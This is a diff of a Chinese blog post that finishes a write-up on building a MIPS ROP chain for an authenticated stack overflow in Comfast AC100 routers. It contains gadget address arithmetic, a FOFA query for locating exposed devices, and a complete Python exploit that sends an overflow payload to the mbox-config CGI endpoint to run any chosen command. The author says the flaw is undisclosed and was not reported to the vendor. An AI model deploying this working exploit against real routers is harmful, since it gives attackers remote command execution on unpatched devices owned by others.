@@ -1,18 +1,25 @@
 ---
-title: Comfast 系列产品 /栈溢出通用利用链构造 - 更新1
+title: Comfast 系列产品 /栈溢出ROP利用链构造 - 10月更新 & 已完结
 published: true
 ---
 
-(未完结) Comfast 本身是个比较小众品牌，出的洞危害范围较小，其安全防御措施也较为轻松，没什么交漏洞库和提醒厂商的必要，没什么好说的.    
+Comfast 本身是个比较小众品牌，出的洞危害范围较小，其安全防御措施也较为轻松，没什么交漏洞库和提醒厂商的必要，没什么好说的.    
 
-不过看到网上关于他的漏洞，都没有写明合适构造链. 因此在此浅浅分析一下几条从栈溢出到 RCE 的普通/特殊利用链就行了，没困难可以创造困难哎！
+不过看到网上关于他的漏洞，都没有写明合适构造链. 因此在此浅浅分析一下 ROP 利用链就行了. 
+
+本文章不遵循 CC 协议，除开特别说明标注，该文章未经许可禁止转载
 
 fofa语法:  
 ```
 icon_hash="-1026040476"
 ```
 
-# [](#header-3)构造
+| 目录跳转 |
+|--------|
+| [直接写shellcode(失败)](#直接写shellcode) |
+| [ROP链构造(成功)](#rop链构造) |
+
+# [](#header-3)直接写shellcode
 
 一个尚未公开的栈溢出PoC(前提是登录，客户端 IP 被服务端记录在案):
 ```py
@@ -84,45 +91,149 @@ data0 += b"mkdir /12345"
 
 不过这倒无所谓，换种方法继续构造罢了  
 
-# [](#header-3)ROP
+# [](#header-3)rop链构造
 
-此时我们的目标是跳到位于 0x2B4002F0 的 system 函数中(如下图所示，此处未开启栈随机化，因此暂时拿 0x2B4002F0 作为其地址). 
+此时笔者的目标是 合理地 跳到位于 0x2B4002F0 的 system 函数中(如下图所示，此处未开启栈随机化，因此暂时拿 0x2B4002F0 作为其地址). 
 
 ![/image/cfac100/3.png](/image/cfac100/4.png)  
 
-由于此处我们无法直接控制 $a0 寄存器，不能够直接跳转到 system 函数中. 因此这里就要找两个 gadget，一个用来控制传参的 $s0 寄存器，一个用来控制 jalr 跳转到的 $t9 寄存器
+由于此处无法直接控制 $a0 寄存器，因此这里就要找两个 gadget，一个用来控制传参的 $s0 和 $a0 寄存器，一个用来控制 jalr 跳转到的 $t9 寄存器
 
 该固件直接加载 ld-uClibc-0.9.33.2.so，因此直接分析 uClibc 中的 ROP gadget 即可. 
 
-简单在 uClibc 中使用 mips gadget 找寻工具利用 mipsrop.find 了一下，发现了两条十分完美的 gadget: 
+uClibc 中是有很多 gadget 的，简单在 uClibc 中使用 mips gadget 找寻工具利用 mipsrop.find 了一下，选了一个比较合适的 gadget. 后面又在 system 中找到了一个能够控制 $t9 和 $a0 的 gadget. 
 
-`mipsrop.find("move $t9")` 
+`mipsrop.find('jr $ra')` 
 
-![/image/cfac100/3.png](/image/cfac100/8.png)  
+![/image/cfac100/3.png](/image/cfac100/11.png)  
 
-1. 第一条在 uClibc 中的地址为 0x4C08，能控制 $s0 - $s7 之间的寄存器，并且其偏移地址为 0x180，远大于下下图所示的 0x12C，是十分理想的在此用来控制寄存器的 gadget.  
-   我们先让 PC 跳到这条 gadget 的起始地址 0x4C08
+1. 第一条 gadget 在 uClibc 中的地址为 0x4E04，能控制 $s0 - $s7 之间的寄存器，是十分理想的在此用来控制寄存器的 gadget.  
    
-	![/image/cfac100/3.png](/image/cfac100/5.png)  
+	![/image/cfac100/3.png](/image/cfac100/12.png)  
+
+	`以下是该函数原始 gadget，明显不够用`
+
 	![/image/cfac100/3.png](/image/cfac100/6.png)  
 
-2. 第二条在 uClibc 中的地址为 0x53B4，首先 move $t9, $s5，而后旋即 jalr 到 $t9，我不得不承认 uClibc 中的这两条 gadget 搭配起来简直是天衣无缝.  
-   我们将上面那条 gadget 的 $ra 设置为 该条 gadget 的起始地址 0x53B4，方便 PC 跳到该 gadget
+	而后计算 uClibc 中 __uClibc_main 至 0x4E04 的偏移量并和加载后的 lib 作计算： `0x2B2B2550 + 0x68 - (0x65B8 - 0x4E04) == 0x2B2B0E04`，再将 PC 跳转到该地址
+
+2. 第二条 gadget 位于 system 函数附近，该 gadget 地址为 0x2B3FFFF4，首先该 gadget 从栈上获取值并赋值给 $a0，而后旋即将 $s7 赋值给 $t9，再 jalr $t9. 这两条 gadget 搭配起来简直是天衣无缝.  
+   将上面那条 gadget 的 $ra 设置为 该条 gadget 的起始地址，方便 PC 跳到该 gadget. 
    
-   ![/image/cfac100/3.png](/image/cfac100/7.png)     
+   ![/image/cfac100/3.png](/image/cfac100/10.png)     
 
-接下来写代码：首先根据偏移量，计算两条 gadget 的位置
+接下来写代码：首先根据偏移量，分别计算两条 gadget 的位置，以及计算 system 原函数地址
+
 ```py
-# 0x2B2B2550 		是 __uClibc_main 函数的起始地址
-# 0x68				是 __uClibc_main 函数起始至 __uClibc_main 函数末尾指令 jr $t9 的距离
-# 0x65B8			是 __uClibc_main 函数在 ld-uClibc-0.9.33.2.so 中指令 jr $t9 的地址
+#by leeya_bug
 
-# jalr $t9
-gadget_jalr_addr 	= 0x2B2B2550 + 0x68 - (0x65B8 - 0x53B4)
-# $s0 - $s7
-gadget_addr 		= 0x2B2B2550 + 0x68 - (0x65B8 - 0x40C8)
+if True:
+	gadget_jalr_addr	= 0x2B3FFFF4
+	# 0x2B2B2550 		是 __uClibc_main 的起始地址
+	# 0x68				是 __uClibc_main 起始至 __uClibc_main 末尾指令 jr $t9 的距离
+	# 0x65B8 - 0x4E04	是 __uClibc_main 中指令 jr $t9 至 gadget 起始距离
+	gadget_addr 		= 0x2B2B2550 + 0x68 - (0x65B8 - 0x4E04)
+	system_addr			= 0x2B4002F0
 ```
 
-再通过 cyclic 生成 De Bruijn 序列探测一下各寄存器的赋值位置：
+接下来在填充必要字符后，写入第一个 gadget 会读取的值，再写入第二个 gadget 会读取的值(这个地方如果读者要自己尝试，建议还是用 De Bruijn 序列探测一下，以防出错)，要命令执行的字符串起始地址是 0x2B2A64D7
 
-由于时间很晚，并且这段时间本人很忙，明天再更新
+```py
+#by leeya_bug
+
+if True:
+	gadget_jalr_addr	= 0x2B3FFFF4
+	# 0x2B2B2550 		是 __uClibc_main 的起始地址
+	# 0x68				是 __uClibc_main 起始至 __uClibc_main 末尾指令 jr $t9 的距离
+	# 0x65B8 - 0x4E04	是 __uClibc_main 中指令 jr $t9 至 gadget 起始距离
+	gadget_addr 		= 0x2B2B2550 + 0x68 - (0x65B8 - 0x4E04)
+	system_addr			= 0x2B4002F0
+
+	data0 = b''
+
+	data0 += b'A' * 248
+	data0 += gadget_addr.to_bytes(4, 'little')			# 第一次 ra
+
+	# gadget 1
+	data0 += b'A' * 24
+	data0 += (0x2B2A64D7).to_bytes(4, 'little') 		# s0 
+	data0 += b'\x01' * 4								# s1 
+	data0 += b'\x02' * 4 								# s2 
+	data0 += b'\x03' * 4 								# s3 
+	data0 += b'\x04' * 4 								# s4 
+	data0 += b'\x03' * 4						 		# s5
+	data0 += b'\x06' * 4 								# s6 
+	data0 += (system_addr).to_bytes(4, 'little') 		# s7 
+	data0 += b'\x08' * 4 								# fa 
+	data0 += (gadget_jalr_addr).to_bytes(4, 'little') 	# 第二次 ra 
+
+	data0 += b'A' * 0xf
+	# 字符串地址
+	data0 += (cmd.encode() + b' #').ljust(85, b'A')
+
+	# gadget 2
+	data0 += (0x2B2A64D7).to_bytes(4, 'little')
+
+```
+
+在这里，我们尝试运行 `echo Successfully-Hacked-By-leeya_bug` 这条 linux 命令看看是否成功  
+最后 Payload:
+
+```py
+#by leeya_bug
+
+import requests
+from pwn import *
+
+def Vul4_AC100(host: str, cmd: str) -> None:
+	'''
+	RCE
+	Requirement: Authorized
+    by leeya_bug
+	'''
+	import requests
+
+	gadget_jalr_addr	= 0x2B3FFFF4
+	# 0x2B2B2550 		是 __uClibc_main 的起始地址
+	# 0x68				是 __uClibc_main 起始至 __uClibc_main 末尾指令 jr $t9 的距离
+	# 0x65B8 - 0x4E04	是 __uClibc_main 中指令 jr $t9 至 gadget 起始距离
+	gadget_addr 		= 0x2B2B2550 + 0x68 - (0x65B8 - 0x4E04)
+	system_addr			= 0x2B4002F0
+
+	data0 = b''
+
+	data0 += b'A' * 248
+	data0 += gadget_addr.to_bytes(4, 'little')			# 第一次 ra
+
+	# gadget 1
+	data0 += b'A' * 24
+	data0 += (0x2B2A64D7).to_bytes(4, 'little') 		# s0 
+	data0 += b'\x01' * 4								# s1 
+	data0 += b'\x02' * 4 								# s2 
+	data0 += b'\x03' * 4 								# s3 
+	data0 += b'\x04' * 4 								# s4 
+	data0 += b'\x03' * 4						 		# s5
+	data0 += b'\x06' * 4 								# s6 
+	data0 += (system_addr).to_bytes(4, 'little') 		# s7 
+	data0 += b'\x08' * 4 								# fa 
+	data0 += (gadget_jalr_addr).to_bytes(4, 'little') 	# 第二次 ra 
+
+	data0 += b'A' * 0xf
+	data0 += (cmd.encode() + b' #').ljust(85, b'A')
+
+	#gadget 2
+	data0 += (0x2B2A64D7).to_bytes(4, 'little')
+	
+	data = b'{"portal_delete_picname":"' + data0 + b'"}'
+	print(requests.post("http://" + host + "/cgi-bin/mbox-config?method=SET&section=wifilith_delete_pic_file", data = data).text)
+
+Vul4_AC100("192.168.20.101", "echo Successfully-Hacked-By-leeya_bug")
+```
+
+一运行，果然固件提示 Successfully-Hacked-By-leeya_bug，成功运行 echo Successfully-Hacked-By-leeya_bug 
+
+证明利用链构造成功
+
+![/image/cfac100/3.png](/image/cfac100/9.png) 
+
+本文章不遵循 CC 协议，除开特别说明标注，该文章未经许可禁止转载
